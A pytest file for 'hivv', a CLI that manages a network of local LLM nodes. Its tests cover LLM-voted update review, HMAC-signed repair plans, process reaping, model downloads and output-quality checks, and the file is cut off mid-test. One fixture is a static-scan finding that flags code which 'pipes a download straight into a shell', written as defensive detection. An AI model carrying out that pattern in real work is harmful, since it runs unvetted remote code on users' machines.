                                              "http://127.0.0.1:9/v1/chat/completions")])
        if track_http is not None:
            def fake_http(method, path, **kw):
                track_http.append((method, path))
                return (200, {"nodes": [{"name": "yalla", "lan_ip": "192.168.1.209",
                                         "local_models": [{"port": 8080, "name": "qwen"}]}]})
            monkeypatch.setattr(hivv, "http", fake_http)
        res = hivv._review_update(b"x = 1\n", b"x = 2\n",
                                  source="manual", budget_s=5)
        return res, state["asks"]

    def test_tie_flagger_holds_flips_to_blocked(self, monkeypatch):
        # local flags, hive approves → tie; flagger cannot cite evidence → BLOCK.
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("ok", "bee:yalla/qwen", "hive")],
            confirm_verdict="suspicious")
        assert res["verdict"] == "suspicious"
        assert "tie broken" in res["reason"]
        assert len(asks) == 1 and "CONCRETE" in asks[0]
        confirms = [v for v in res["votes"] if v.get("via") == "confirm"]
        assert confirms and confirms[0]["verdict"] == "suspicious"

    def test_tie_flagger_retracts_passes(self, monkeypatch):
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("ok", "bee:yalla/qwen", "hive")],
            confirm_verdict="ok")
        assert res["verdict"] == "ok"
        assert "not confirmed" in res["reason"]
        assert len(asks) == 1

    def test_unanimous_flag_still_faces_evidence_demand(self, monkeypatch):
        # Even 2/2 suspicious cannot skip the re-ask on a clean static scan —
        # this was the exact 0.5B-brain vibes-veto class from 2026-11-14.
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("suspicious", "bee:yalla/qwen", "hive")],
            confirm_verdict="ok")
        assert len(asks) == 1 and "CONCRETE" in asks[0]
        assert res["verdict"] == "ok" and "not confirmed" in res["reason"]

    def test_critical_static_skips_confirmation_entirely(self, monkeypatch):
        # A pattern-scan critical is corroborated evidence — no re-ask allowed.
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("suspicious", "bee:yalla/qwen", "hive")],
            confirm_verdict="ok",
            static_findings=[{"severity": "critical",
                              "why": "pipes a download straight into a shell",
                              "line_no": 1, "line": "x"}])
        assert res["verdict"] == "suspicious"
        assert "critical pattern" in res["reason"]
        assert asks == [], "critical must never trigger the confirm round"

    def test_hive_flagger_confirm_resolves_via_hub_nodes(self, monkeypatch):
        # tie with the HIVE brain as flagger: confirm must re-resolve its
        # endpoint through GET /api/control/nodes (http path).
        http_calls = []
        res, asks = self._run(
            monkeypatch,
            [self._vote("ok", "local:port:8090", "local")],
            [self._vote("suspicious", "bee:yalla/qwen3", "hive")],
            confirm_verdict="ok",
            track_http=http_calls)
        assert http_calls and http_calls[0][1] == "/api/control/nodes"
        assert len(asks) == 1
        assert res["verdict"] == "ok" and "not confirmed" in res["reason"]


# ── 17. display helpers (narrow table columns) ───────────────────────────
class TestDisplayShorts:
    def test_intel_full_string_compacts(self):
        assert hivv._short_cpu("Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz") == "i7-10700 @2.9G"

    def test_amd_ryzen_strips_boilerplate(self):
        assert hivv._short_cpu("AMD Ryzen 7 5800X 8-Core Processor") == "Ryzen 7 5800X"

    def test_apple_passthrough(self):
        assert hivv._short_cpu("Apple M2 Pro") == "M2 Pro"

    def test_none_empty_unknown(self):
        assert hivv._short_cpu(None) == "?"
        assert hivv._short_cpu("") == "?"
        assert hivv._short_cpu("?") == "?"

    def test_width_cap_with_ellipsis(self):
        out = hivv._short_cpu("Some Very Long Unknown CPU Model Name That Never Fits", width=12)
        assert len(out) <= 12 and out.endswith("…")

    def test_gpu_strips_nvidia_geforce(self):
        assert hivv._short_gpu("NVIDIA GeForce RTX 3060") == "RTX 3060"

    def test_gpu_quadro_keeps_model_line(self):
        assert hivv._short_gpu("NVIDIA Quadro K1200") == "Quadro K1200"

    def test_gpu_amd_radeon(self):
        assert hivv._short_gpu("AMD Radeon RX 6800 XT") == "RX 6800 XT"

    def test_gpu_bare_name_untouched(self):
        assert hivv._short_gpu("GTX 1660 SUPER") == "GTX 1660 SUPER"

    def test_gpu_none_unknown(self):
        assert hivv._short_gpu(None) == "?"
        assert hivv._short_gpu("") == "?"

    def test_gpu_width_cap(self):
        out = hivv._short_gpu("NVIDIA GeForce Some Extremely Long Card Name", width=10)
        assert len(out) <= 10 and out.endswith("…")

    def test_cpu_model_is_str_or_none(self):
        v = hivv._cpu_model()
        assert v is None or (isinstance(v, str) and v.strip())


# ── 18. state durability (the 2026-11-14 node_secret wipe) ───────────────
class TestStateDurability:
    def test_write_state_atomic_no_tmp_left(self):
        hivv.write_state({"probe": 1})
        assert json.loads(hivv.STATE_FILE.read_text()) == {"probe": 1}
        tmp = hivv.STATE_FILE.with_name(hivv.STATE_FILE.name + ".tmp")
        assert not tmp.exists(), "write_state must not leave a temp file"
        hivv.write_state({})   # leave the isolated state clean

    def test_torn_state_read_returns_empty_not_crash(self):
        # A torn write (old bug) must degrade to {} so callers merge instead
        # of raising — paired with atomic writes so {} should be rare.
        hivv.STATE_FILE.write_text('{"node_secret": "abcd')   # truncated JSON
        assert hivv.read_state() == {}
        hivv.write_state({})

    def test_cmd_agent_merges_state_never_resets(self, monkeypatch):
        # Canary: cmd_agent used to write_state({6 keys}) — wiping node_secret
        # on EVERY restart/execv → inbox 403 forever (masjid+ashy 2026-11-14).
        src = CLI_PATH.read_text(encoding="utf-8")
        block = src.split("def cmd_agent", 1)[1].split("\ndef ", 1)[0]
        assert "st = read_state()" in block, "cmd_agent must read before writing"
        assert "st.update(" in block, "cmd_agent must merge into existing state"
        assert 'write_state({"started_at"' not in src, (
            "fresh-dict write_state in cmd_agent regresses the node_secret wipe")


# ── 19. duplicate-reaper keeper priority ─────────────────────────────────
class TestReaperPriority:
    def test_systemd_pid_beats_pidfile_and_newest(self, monkeypatch):
        killed = []
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [900001, 900002, 900003])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: 900002)
        monkeypatch.setattr(hivv, "read_pid", lambda: 900003)
        monkeypatch.setattr(hivv.os, "kill",
                            lambda p, s: killed.append(p))
        k, kept, note = hivv._reap_duplicate_agents()
        assert kept == 900002, "systemd's MainPID must win (killing it makes systemd restart it)"
        assert sorted(k) == [900001, 900003]
        assert 900002 not in killed

    def test_pidfile_preferred_without_systemd(self, monkeypatch):
        killed = []
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [900001, 900002])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: None)
        monkeypatch.setattr(hivv, "read_pid", lambda: 900002)
        monkeypatch.setattr(hivv.os, "kill", lambda p, s: killed.append(p))
        k, kept, _ = hivv._reap_duplicate_agents()
        assert kept == 900002
        assert k == [900001]

    def test_never_kills_itself(self, monkeypatch):
        me = os.getpid()
        killed = []
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [me, 900001])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: None)
        monkeypatch.setattr(hivv, "read_pid", lambda: None)  # stale pidfile
        monkeypatch.setattr(hivv.os, "kill", lambda p, s: killed.append(p))
        k, kept, _ = hivv._reap_duplicate_agents()
        assert kept == me, "with no pidfile/systemd, the repairing agent keeps itself"
        assert k == [900001] and me not in killed

    def test_single_agent_is_noop(self, monkeypatch):
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [900001])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: None)
        k, kept, note = hivv._reap_duplicate_agents()
        assert k == [] and kept == 900001 and note == ""


# ── 20. stale launcher self-heal (fail-safe around the hub) ──────────────
class TestWrapperRefresh:
    def test_no_wrapper_is_noop(self, monkeypatch):
        monkeypatch.setattr(hivv, "_is_dev_mode", lambda: False)
        monkeypatch.setattr(hivv.shutil, "which", lambda *a, **k: None)
        hivv._refresh_wrapper_if_stale()   # must not raise

    def test_healthy_wrapper_never_touches_network(self, monkeypatch, tmp_path):
        w = tmp_path / "hivv"
        w.write_text('#!/usr/bin/env bash\n# CLIENT_FILE=x\nexec python3 cli.py "$@"\n')
        monkeypatch.setattr(hivv, "_is_dev_mode", lambda: False)
        monkeypatch.setattr(hivv.shutil, "which", lambda *a, **k: str(w))
        monkeypatch.setattr(hivv, "_http_get_bytes",
                            lambda *a, **k: (_ for _ in ()).throw(
                                AssertionError("healthy wrapper must not fetch")))
        before = w.read_bytes()
        hivv._refresh_wrapper_if_stale()
        assert w.read_bytes() == before

    def test_stale_wrapper_survives_hub_outage(self, monkeypatch, tmp_path):
        # stale form (captures output) + dead hub → leave file untouched, no raise
        w = tmp_path / "hivv"
        w.write_bytes(b'#!/usr/bin/env bash\n# CLIENT_FILE=x\n'
                      b'out=$(python3 "$CLIENT_FILE" "$@")\n'
                      b'result=$?\n' + b'echo "$out"\nexit $result\n'
                      + b'cli_output=$(\n')
        monkeypatch.setattr(hivv, "_is_dev_mode", lambda: False)
        monkeypatch.setattr(hivv.shutil, "which", lambda *a, **k: str(w))
        before = w.read_bytes()
        hivv._refresh_wrapper_if_stale()   # HUB is the dead port in this suite
        assert w.read_bytes() == before, "failed refresh must not clobber the launcher"
        assert not w.with_name(w.name + ".new").exists()


# ── 21. repair HMAC parity (bee side of the hub signer) ──────────────────
class TestRepairSignatureParity:
    """The hub signs ts\\n ttl\\n sorted-compact-ops; the bee verifies the same
    canonical. 2026-11-14: hub signed INSERTION-order ops → every multi-key
    (cli_update) plan failed verification. These tests pin the contract."""
    import hmac as _hmac
    import hashlib as _hashlib
    SECRET = "parity-secret-0123456789"

    def _payload(self, ops, sig):
        return {"plan_id": "rp_parity", "ts": 1794700000, "ttl_s": 300,
                "ops": ops, "reason": "t", "sig": sig}

    def _sig(self, canonical: str) -> str:
        return self._hmac.new(self.SECRET.encode(), canonical.encode(),
                              self._hashlib.sha256).hexdigest()

    def test_sorted_compact_canonical_verifies(self):
        ops = [{"op": "cli_update", "force": True}]
        canon = (f"1794700000\n300\n"
                 + json.dumps(ops, sort_keys=True, separators=(",", ":")))
        p = self._payload(ops, self._sig(canon))
        assert hivv._repair_signature_ok(self.SECRET, p) is True

    def test_insertion_order_sig_rejected(self):
        # the exact 2026-11-14 bug: compact-but-UNSORTED (JS JSON.stringify)
        ops = [{"op": "cli_update", "force": True}]
        wrong = (f"1794700000\n300\n" + json.dumps(ops, separators=(",", ":")))
        p = self._payload(ops, self._sig(wrong))
        assert hivv._repair_signature_ok(self.SECRET, p) is False

    def test_tampered_ops_rejected(self):
        ops = [{"op": "cli_update", "force": True}]
        canon = (f"1794700000\n300\n"
                 + json.dumps(ops, sort_keys=True, separators=(",", ":")))
        p = self._payload(ops, self._sig(canon))
        p["ops"] = [{"op": "cli_update", "force": False}]   # flip force after signing
        assert hivv._repair_signature_ok(self.SECRET, p) is False

    def test_wrong_secret_rejected(self):
        ops = [{"op": "reap_duplicates"}]
        canon = (f"1794700000\n300\n"
                 + json.dumps(ops, sort_keys=True, separators=(",", ":")))
        p = self._payload(ops, self._sig(canon))
        assert hivv._repair_signature_ok("other-secret", p) is False

    def test_missing_sig_rejected(self):
        ops = [{"op": "reap_duplicates"}]
        p = self._payload(ops, "")
        assert hivv._repair_signature_ok(self.SECRET, p) is False


# ── 22. chat flag recovery (REMAINDER swallowed documented flags) ─────────
class TestChatFlagRecovery:
    """`hivv chat "hi" --mode=fast` is the documented form, but
    nargs=REMAINDER put `--mode=fast` INTO the message and left mode=None
    (live hit 2026-11-15: model echoed 'PONG --mode=fast'). cmd_chat must
    recover known flags from the remainder."""

    def _run(self, message_parts, mode=None, monkeypatch=None):
        import argparse as _ap
        captured = {}

        def fake_do_chat(msg, stream=True, mode=None, local=False):
            captured["msg"] = msg
            captured["mode"] = mode
            captured["local"] = local

        orig = hivv._do_chat
        hivv._do_chat = fake_do_chat
        try:
            ns = _ap.Namespace(message=message_parts, mode=mode)
            hivv.cmd_chat(ns)
        finally:
            hivv._do_chat = orig
        return captured

    def test_flag_after_message_is_extracted(self):
        out = self._run(["Reply with exactly: PONG", "--mode=fast"])
        assert out["msg"] == "Reply with exactly: PONG"
        assert out["mode"] == "fast"

    def test_flag_before_message_still_works(self):
        out = self._run(["Reply with exactly: PONG"], mode="fast")
        assert out["msg"] == "Reply with exactly: PONG"
        assert out["mode"] == "fast"

    def test_unknown_flag_stays_in_message(self):
        out = self._run(["keep this text", "--mode=notamode"])
        assert "--mode=notamode" in out["msg"], "unknown values are literal text"
        assert out["mode"] is None

    def test_space_separated_flag(self):
        out = self._run(["hello world", "--mode", "cheap"])
        assert out["msg"] == "hello world"
        assert out["mode"] == "cheap"

    def test_multiword_message_preserved(self):
        out = self._run(["what", "is", "the", "hive"])
        assert out["msg"] == "what is the hive"
        assert out["mode"] is None

    def test_parser_remainder_is_the_root_cause(self):
        # documents WHY: the parser itself swallows trailing flags
        import argparse as _ap  # noqa: F401
        p = hivv.build_parser()
        a = p.parse_args(["chat", "hi", "--mode=fast"])
        assert a.message == ["hi", "--mode=fast"] and a.mode is None


# ── 18. macOS metric collectors (2026-11-18: Darwin bees reported all-zero
#        metrics — RAM '?' in `hivv nodes`, no GPU, no uptime, cpu% never sent)
# ─────────────────────────────────────────────────────────────────────────────
class TestDarwinMetricParsers:
    VM_STAT = (
        "Mach Virtual Memory Statistics: (page size of 4096 bytes)\n"
        "Pages free:                                  100.\n"
        "Pages active:                                300.\n"
        "Pages inactive:                              150.\n"
        "Pages speculative:                             5.\n"
        "Pages wired down:                           200.\n"
        "Pages purgeable:                             20.\n"
        "Files:                                      300.\n"
    )

    def test_vm_stat_reclaimable_counts_as_available(self):
        # free+inactive+speculative+purgeable+files = 575 of 1000 pages → 42.5%
        out = hivv._parse_vm_stat(self.VM_STAT, 4096, 4096 * 1000)
        assert out["mem_pct"] == 42.5
        assert out["mem_total_mb"] == (4096 * 1000) // 1024 // 1024 == 3
        assert out["mem_avail_mb"] == (4096 * 575) // 1024 // 1024 == 2
        assert out["mem_used_mb"] == (4096 * 425) // 1024 // 1024 == 1

    def test_vm_stat_empty_inputs_are_empty(self):
        assert hivv._parse_vm_stat("", 4096, 4096 * 1000) == {}
        assert hivv._parse_vm_stat(self.VM_STAT, 4096, 0) == {}

    def test_kern_boottime_parses_seconds(self):
        s = "{ sec = 1795033880, usec = 483411 } Wed Nov 13 09:11:20 2026"
        assert hivv._parse_boottime(s) == 1795033880

    def test_kern_boottime_garbage_is_zero(self):
        assert hivv._parse_boottime("garbage") == 0
        assert hivv._parse_boottime("") == 0

    def test_system_profiler_gpus_shape(self):
        gpus = hivv._parse_display_gpus({"SPDisplaysDataType": [
            {"_name": "Radeon Pro Vega 56", "sppci_VRAM": "16 GB",
             "spdisplays_vram_shared": False},
            {"_name": "Apple M2 Pro"},
        ]})
        assert gpus[0]["mem_total_mb"] == 16384          # the bool key is skipped
        assert gpus[0]["util_known"] is False and gpus[0]["util_pct"] == 0
        assert gpus[1]["mem_total_mb"] == 0               # Apple silicon: no VRAM key

    def test_measure_pings_skips_nodes_without_ports(self):
        assert hivv._measure_pings([]) == {}
        assert hivv._measure_pings([{"id": "x", "status": "online"}]) == {}

    def test_xeon_model_fits_the_22_wide_cpu_column(self):
        out = hivv._short_cpu("Intel(R) Xeon(R) W-2150B CPU @ 3.00GHz", width=22)
        assert out == "Intel Xeon W-2150B @3G" and not out.endswith("…")


# ── 19. speed ledger + one-shot llm setup dispatch (2026-11-18) ─────────────
class TestSpeedsAndSetupDispatch:
    def test_speeds_command_registered(self):
        assert hivv.COMMANDS.get("speeds") is hivv.cmd_speeds

    def test_llm_setup_registered(self):
        assert hivv.COMMANDS.get("llm setup") is hivv.cmd_llm_setup

    def test_install_llm_never_reaches_chat_smart_default(self):
        # `hivv install llm` used to be SENT TO THE MODEL as a chat message
        src = CLI_PATH.read_text()
        assert 'argv[1] in ("llm", "model", "models", "ai")' in src
        assert '"llm setup"' in src and "cmd_llm_setup" in src


# ── 20. gguf download: macOS has curl, NOT wget (FileNotFoundError crash
#        on `hivv llm pull-gguf gemma4:e2b`, 2026-11-18) ─────────────────────
class TestGgufDownload:
    def test_curl_fallback_when_no_wget(self, monkeypatch):
        monkeypatch.setattr(hivv.shutil, "which",
                            lambda n: "/usr/bin/curl" if n == "curl" else None)
        cmd = hivv._gguf_download_cmd("https://x/y.gguf", "/tmp/nonexistent.gguf")
        assert cmd[0] == "curl" and "-fL" in cmd and cmd[-1] == "https://x/y.gguf"

    def test_wget_preferred_when_present(self, monkeypatch):
        monkeypatch.setattr(hivv.shutil, "which",
                            lambda n: "/usr/bin/wget" if n == "wget" else None)
        cmd = hivv._gguf_download_cmd("https://x/y.gguf", "/tmp/nonexistent.gguf")
        assert cmd[0] == "wget"

    def test_no_downloader_is_none_not_crash(self, monkeypatch):
        monkeypatch.setattr(hivv.shutil, "which", lambda n: None)
        assert hivv._gguf_download_cmd("https://x/y.gguf", "/tmp/nonexistent.gguf") is None

    def test_curl_resumes_partial_file(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv.shutil, "which",
                            lambda n: "/usr/bin/curl" if n == "curl" else None)
        partial = tmp_path / "m.gguf"
        partial.write_bytes(b"GGUF partial bytes")
        cmd = hivv._gguf_download_cmd("https://x/y.gguf", str(partial))
        assert "-C" in cmd and cmd[-1] == "https://x/y.gguf"

    def test_gguf_magic_check(self, tmp_path):
        good = tmp_path / "good.gguf"
        good.write_bytes(b"GGUF\x00\x01\x02\x03")
        bad = tmp_path / "bad.gguf"
        bad.write_bytes(b"<html>proxy error</html>")
        assert hivv._gguf_ok(str(good)) is True
        assert hivv._gguf_ok(str(bad)) is False
        assert hivv._gguf_ok(str(tmp_path / "missing.gguf")) is False


# ── 21. upgrade-review brain fan-out must not stall (2026-11-18: yalla's
#        locked endpoint burned the full 32s vote timeout on every update) ──
class TestHiveBrainPicker:
    NODES = [{"status": "online", "name": "zz-test-bee", "id": "zz-test-bee",
              "lan_ip": "192.0.2.10",
              "local_models": [
                  {"model": "locked (api-key required)", "locked": True, "port": 8081},
                  {"model": "gemma-x-Q4_K_M.gguf", "name": "gemma-x-Q4_K_M.gguf",
                   "port": 8080}]}]

    @staticmethod
    def _patch(monkeypatch, called, tcp_ok=True):
        monkeypatch.setattr(hivv, "http",
                            lambda *a, **k: (200, {"nodes": TestHiveBrainPicker.NODES}))
        monkeypatch.setattr(hivv, "_tcp_ok", lambda ip, port, timeout=0.8: tcp_ok)
        monkeypatch.setattr(hivv, "_ask_review_brain",
                            lambda url, prompt, timeout=30.0:
                            (called.append(url) or {"verdict": "ok", "reason": "fine", "ms": 5}))

    def test_locked_endpoint_is_never_asked(self, monkeypatch):
        called = []
        self._patch(monkeypatch, called)
        votes = hivv._review_hive_brains("review this")
        assert called == ["http://192.0.2.10:8080/v1/chat/completions"], \
            "the keyed/locked server must be skipped, not burned for 32s"
        assert votes and votes[0]["brain"].startswith("bee:zz-test-bee/")
        assert votes[0]["verdict"] == "ok"

    def test_unreachable_bee_fails_fast_not_32s(self, monkeypatch):
        called = []
        self._patch(monkeypatch, called, tcp_ok=False)
        votes = hivv._review_hive_brains("review this")
        assert called == [], "no LLM call should be attempted for a dead TCP port"
        assert votes and votes[0]["verdict"] is None
        assert "unreachable" in votes[0]["reason"]


# ── 22. local-only chat + fresh-node port fallback (2026-11-18) ─────────────
class TestLocalChatAndNodePorts:
    def test_local_alias_split(self):
        assert hivv._split_local_chat(["local", "hi"]) == (True, "hi")
        assert hivv._split_local_chat(["local"]) == (True, "")
        assert hivv._split_local_chat(["hello"]) == (False, "hello")
        assert hivv._split_local_chat([]) == (False, "")

    def test_chat_parser_local_flag(self):
        a = hivv.build_parser().parse_args(["chat", "--local", "hi"])
        assert a.local is True and a.message == ["hi"]

    def test_cmd_chat_recovers_local_from_remainder(self, monkeypatch):
        seen = {}
        monkeypatch.setattr(hivv, "_do_chat",
                            lambda msg, stream=True, mode=None, local=False:
                            seen.update(msg=msg, local=local))
        from argparse import Namespace
        # `hivv chat hi --local` — REMAINDER swallows the flag; cmd_chat recovers it
        hivv.cmd_chat(Namespace(message=["hi", "--local"], mode=None, local=False))
        assert seen == {"msg": "hi", "local": True}
        # `hivv chat local hello` — first-token alias
        hivv.cmd_chat(Namespace(message=["local", "hello"], mode=None, local=False))
        assert seen == {"msg": "hello", "local": True}
        # plain chat untouched
        hivv.cmd_chat(Namespace(message=["hello", "world"], mode=None, local=False))
        assert seen == {"msg": "hello world", "local": False}

    def test_node_ports_prefers_reported_models_without_probing(self, monkeypatch):
        def _boom(*a, **k):
            raise AssertionError("must not probe when the registry has models")
        monkeypatch.setattr(hivv, "_tcp_ok", _boom)
        ports = hivv._node_llm_ports(
            {"local_models": [{"provider": "llama.cpp:8080", "port": 8080},
                              {"provider": "ollama", "port": 11434}]})
        assert ports == [8080, 11434]

    def test_node_ports_probes_common_when_none_reported(self, monkeypatch):
        monkeypatch.setattr(hivv, "_tcp_ok",
                            lambda ip, port, timeout=0.8: port == 8080)
        assert hivv._node_llm_ports({"lan_ip": "192.0.2.7", "local_models": []}) == [8080]
        assert hivv._node_llm_ports({"local_models": []}) == []   # no IP → []

    def test_setup_never_claims_live_after_failed_probe(self):
        src = CLI_PATH.read_text()
        assert 'die(f"llama-server not answering after 60s' in src
        assert "not answering yet after 30s — check" not in src, \
            "a failed probe must abort, not fall through to the success banner"


# ── 23. degenerate-output guard (2026-11-18): a FAST garbage model would win
#        the routing EWMA and spread loops across the hive — it must score as
#        FAILED, not healthy. Fixtures use the REAL Stuarts-iMac gemma loop. ──
class TestDegenerateOutput:
    IMAC_LOOP = (
        "}}^}}^}}^ 협 협hommehommehommehommehommehomme "
        "kiểu kiểu kiểu kiểu kiểu kiểu kiểu kiểu kiểu kiểu kiểu kiểu kiểu "
        "Keen Keen Keen Keen Keen "
        "servedservedservedservedservedservedservedservedservedserved"
        "servedservedservedserved"
    )
    NORMAL = ("Hello! How can I help you today? I can explain the hive, "
              "check your nodes, or just chat — whatever you need.")

    def test_real_imac_loop_is_flagged(self):
        assert hivv._looks_degenerate(self.IMAC_LOOP) is True

    def test_normal_reply_passes(self):
        assert hivv._looks_degenerate(self.NORMAL) is False

    def test_short_answers_never_flagged(self):
        # the min-length rule keeps tiny replies ('OK', 'ha ha ha ha') safe
        assert hivv._looks_degenerate("OK") is False
        assert hivv._looks_degenerate("ha ha ha ha ha ha ha ha") is False
        assert hivv._looks_degenerate("") is False
        assert hivv._looks_degenerate(None) is False

    def test_spaced_adjacent_loop_flagged(self):
        text = ("this reply starts fine and then the model slips: "
                "loop loop loop loop loop loop loop end.")
        assert hivv._looks_degenerate(text) is True

    def test_control_char_noise_flagged(self):
        assert hivv._looks_degenerate("A" * 30 + "\x00" * 10) is True

    def test_dominant_word_without_adjacency_flagged(self):
        text = ("served okay served fine served yes served no served go "
                "served end of a normal sentence here")
        assert hivv._looks_degenerate(text) is True

    def test_repeated_punctuation_noise_flagged(self):
        assert hivv._looks_degenerate("what " + (".........." * 5) + " nonsense") is True


# ── 24. nodes table: cores/threads + live CPU use (2026-11-18) ──────────────
class TestCoresAndUse:
    CPUINFO_2SMT = (
        "processor : 0\nphysical id : 0\ncore id : 0\n\n"
        "processor : 1\nphysical id : 0\ncore id : 1\n\n"
        "processor : 2\nphysical id : 1\ncore id : 0\n\n"
        "processor : 3\nphysical id : 1\ncore id : 1\n"
    )
    CPUINFO_SOCKET_FALLBACK = (
        "processor : 0\nphysical id : 0\ncpu cores : 4\n\n"
        "processor : 1\nphysical id : 0\ncpu cores : 4\n"
    )
    CPUINFO_ARM = "processor : 0\nBogoMIPS : 100.0\nprocessor : 1\nBogoMIPS : 100.0\n"

    def test_unique_physical_core_pairs(self):
        # 2 sockets × 2 cores → 4 unique (physical id, core id) pairs
        assert hivv._parse_cpuinfo_physical(self.CPUINFO_2SMT) == 4

    def test_socket_times_cores_fallback(self):
        assert hivv._parse_cpuinfo_physical(self.CPUINFO_SOCKET_FALLBACK) == 4

    def test_arm_returns_zero_not_guess(self):
        assert hivv._parse_cpuinfo_physical(self.CPUINFO_ARM) == 0

    def test_cores_use_full_facts(self):
        n = {"system": {"cpus": 20},
             "metrics": {"cpu_count": 20, "cpu_physical": 10, "cpu_percent": 21.4}}
        assert hivv._cores_use_str(n) == "10c/20t 21%"

    def test_cores_use_threads_only_when_physical_unknown(self):
        n = {"system": {"cpus": 8}, "metrics": {"cpu_count": 8}}
        assert hivv._cores_use_str(n) == "8t —"

    def test_cores_use_zero_cpu_is_real_idle_not_missing(self):
        n = {"metrics": {"cpu_count": 4, "cpu_physical": 4, "cpu_percent": 0}}
        assert hivv._cores_use_str(n) == "4c/4t 0%"

    def test_cores_use_empty_node(self):
        assert hivv._cores_use_str({}) == "? —"


# ── 25. gguf sanity (a truncated model LOADED but answers with garbage) ──────
class TestGgufSanity:
    def test_good_file_passes(self, tmp_path):
        p = tmp_path / "m.gguf"
        p.write_bytes(b"GGUF" + b"\x00" * 4096)
        assert hivv._gguf_sanity(str(p), expect_gb=0) == ""

    def test_html_error_page_rejected(self, tmp_path):
        p = tmp_path / "m.gguf"
        p.write_bytes(b"<html>proxy error</html>")
        assert "GGUF magic" in hivv._gguf_sanity(str(p), expect_gb=0)

    def test_truncated_download_rejected(self, tmp_path):
        p = tmp_path / "m.gguf"
        p.write_bytes(b"GGUF" + b"\x00" * 1024)          # ≈0.000001 GB
        reason = hivv._gguf_sanity(str(p), expect_gb=2.5)
        assert "truncated" in reason

    def test_missing_file_rejected(self, tmp_path):
        assert hivv._gguf_sanity(str(tmp_path / "nope.gguf")) != ""


# ── 26. serve/setup --host (peers can't reach 127.0.0.1 — Stuarts-iMac) ─────
class TestServeHostFlag:
    def test_both_parsers_have_host_flag(self):
        src = CLI_PATH.read_text()
        assert src.count('add_argument("--host"') >= 2   # serve-llama + setup

    def test_launch_commands_use_the_host_variable(self):
        # both llama-server launch sites must pass the ARG, not a hardcoded loopback
        assert CLI_PATH.read_text().count('"--host", host') >= 2

    def test_setup_parser_accepts_host(self):
        a = hivv.build_parser().parse_args(
            ["llm", "setup", "--host", "0.0.0.0", "--port", "8090"])
        assert a.host == "0.0.0.0" and a.port == 8090


# ── 27. benchmark works from OUTSIDE the LAN (hub-measured fallback) ─────────
class TestBenchmarkRemoteFallback:
    NODES = {"nodes": [{"status": "online", "name": "masjid", "id": "masjid",
                        "lan_ip": "192.0.2.55",
                        "local_models": [{"provider": "llama.cpp:8080", "port": 8080}]}],
             "online": 1, "total": 1}
    PERF = {"samples": [{"node": "masjid", "via": "direct",
                         "ewma_tps": 118.5, "ewma_latency_ms": 94,
                         "model": "gemma-4"}]}

    def test_unreachable_node_falls_back_to_hub_perf(self, monkeypatch, capsys):
        def fake_http(method, path, **kw):
            if path.startswith("/api/hive/perf"):
                return 200, self.PERF
            return 200, self.NODES
        monkeypatch.setattr(hivv, "http", fake_http)
        monkeypatch.setattr(hivv, "_tcp_ok", lambda *a, **k: False)  # off-LAN
        from argparse import Namespace
        hivv.cmd_benchmark(Namespace())
        out = capsys.readouterr().out
        assert "hub-measured: 118.5 tok/s, 94ms" in out
        assert "fastest" not in out, "no live probe → no fake fastest winner"


# ── 28. local chat bounded + Ctrl-C clean (the Stuarts-iMac garbage session) ─
class TestLocalChatBounds:
    def test_local_chat_payload_is_bounded(self):
        src = CLI_PATH.read_text()
        assert '"repeat_penalty": 1.1' in src
        assert "HIVV_LOCAL_MAX_TOKENS" in src

    def test_ctrl_c_exits_without_traceback(self):
        src = CLI_PATH.read_text()
        assert "sys.exit(130)" in src


# ── 29. hivv exam — first-boot quality check (2026-11-18) ───────────────────
class TestExam:
    def test_score_parsers(self):
        assert hivv._parse_score("SCORE: 8") == 8.0
        assert hivv._parse_score("score: 7.5/10\nREASON: fine") == 7.5
        assert hivv._parse_score("I'd give it 9/10 honestly") == 9.0
        assert hivv._parse_score("no numbers here") is None
        assert hivv._parse_score("") is None
        assert hivv._parse_score(None) is None
        assert hivv._parse_score("SCORE: 15") == 10.0      # clamped to 10

    @staticmethod
    def _r(**kw):
        base = {"cat": "logic", "points": 10, "answer": "fine",
                "check": None, "passed": False, "judge_avg": None,
                "degenerate": False}
        base.update(kw)
        return base

    def test_deterministic_pass_and_fail(self):
        score, _ = hivv._exam_total([
            self._r(points=10, check=lambda a: True, passed=True),
            self._r(cat="math", points=20, check=lambda a: False, passed=False),
        ])
        assert score == 33        # 10 of 30 points

    def test_degenerate_answer_always_zero(self):
        # even if a check 'would have passed', a repetition loop scores 0
        score, _ = hivv._exam_total([
            self._r(points=10, check=lambda a: True, passed=True,
                    answer="391servedservedservedservedservedserved", degenerate=True)])
        assert score == 0

    def test_judge_thresholds(self):
        # ≥6/10 full · ≥3 half · below → 0 (they don't have to be perfect!)
        score, d = hivv._exam_total([
            self._r(points=10, judge_avg=7.5),
            self._r(points=10, judge_avg=4.0),
            self._r(points=10, judge_avg=1.0),
        ])
        assert score == 50 and d["judged"] == 3

    def test_unjudged_question_excluded_not_penalized(self):
        score, d = hivv._exam_total([
            self._r(cat="philosophy", points=25, answer="be kind",
                    judge_avg=None),                 # no judge → excluded
            self._r(points=10, check=lambda a: True, passed=True),
        ])
        assert score == 100 and d["unjudged"] == 1

    def test_empty_answer_scores_zero(self):
        score, _ = hivv._exam_total([self._r(points=10, answer="")])
        assert score == 0

    def test_question_set_sums_to_100_and_covers_categories(self):
        assert sum(q["points"] for q in hivv._EXAM_QUESTIONS) == 100
        cats = {q["cat"] for q in hivv._EXAM_QUESTIONS}
        assert {"logic", "math", "science", "philosophy"} <= cats

    def test_exam_registered_and_parses(self):
        assert hivv.COMMANDS.get("exam") is hivv.cmd_exam
        a = hivv.build_parser().parse_args(["exam", "--show", "--no-judge"])
